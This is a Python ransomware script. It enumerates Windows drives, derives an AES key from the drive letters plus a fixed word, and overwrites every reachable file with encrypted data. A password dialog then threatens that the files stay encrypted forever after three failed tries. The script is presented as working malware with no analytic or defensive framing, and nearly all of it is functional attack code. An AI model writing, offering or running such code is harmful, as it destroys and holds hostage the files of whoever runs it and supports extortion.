import os
from ctypes import windll
from string import ascii_uppercase
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
from tkinter import Tk
from tkinter.simpledialog import askstring


def crypt_basic(pw):
    default_salt = b'\x90\x997\x07\x12n\\P\x94\x0f\xe9[\x97U2\xd3_\x9cP\xc2\xf6\xed\xf6\xacO\xb2\xccm\xcb\xaf[\x0f'
    default_key = PBKDF2(pw, default_salt, dkLen=32)
    cipher = AES.new(default_key, AES.MODE_CBC)
    return default_salt, default_key, cipher


def get_drives(mode):
    pw = ""
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in ascii_uppercase:
        if bitmask & 1:
            drives.append(letter + ":")
        bitmask >>= 1
    drives.append("sportacus")
    for i in drives:
        pw += i
    if mode == 0:
        return drives, pw
    elif mode == 1:
        return drives
    return drives, pw


def encrypt(i, salt, method, mode):
    drives = get_drives(1)
    for drive in drives:
        try:
            os.chdir(drives[drives.index(drive) + i])
        except IndexError:
            return True
        for root, sub, file in os.walk(drives[drives.index(drive)]):
            try:
                for files in file:
                    with open(os.path.join(root, files), "rb")as f:
                        file_bytes = f.read()
                    with open(os.path.join(root, files), "wb")as f:
                        f.write(salt)
                        f.write(method.iv)
                        f.write(method.encrypt(pad(file_bytes, AES.block_size)))
            except:
                pass
            i += 1


def decrypt(dkey, i):
    drives = get_drives(1)
    for drive in drives:
        try:
            os.chdir(drives[drives.index(drive) + i])
        except IndexError:
            quit()
        for root, sub, file in os.walk(drives[drives.index(drive)]):
            try:
                for files in file:
                    with open(os.path.join(root, files), "rb")as f:
                        f.read(32)
                        iv = f.read(16)
                        file_bytes = f.read()
                    method = AES.new(dkey, AES.MODE_CBC, iv=iv)
                    original_data = unpad(method.decrypt(file_bytes), AES.block_size)
                    with open(os.path.join(root, files), "wb")as f:
                        f.write(original_data)
            except:
                pass
            i += 1


def dialog(pw):
    i = 3
    answer = ""
    root = Tk()
    root.withdraw()
    while answer != pw:
        if i == 0:
            return False
        answer = askstring(title="Enter Password", prompt="All your files have been encrypted in oder to decrypt them you have to enter the password.\nIf you close this windows your files will be encrypted forever!\n{} tries left".format(i))
        if answer is None:
            return False
        i -= 1
    return True


drives, pwd = get_drives(0)
salt, key, method = crypt_basic(pwd)
while not encrypt(1, salt, method, True):
    pass
if dialog(pwd):
    decrypt(key, 1)
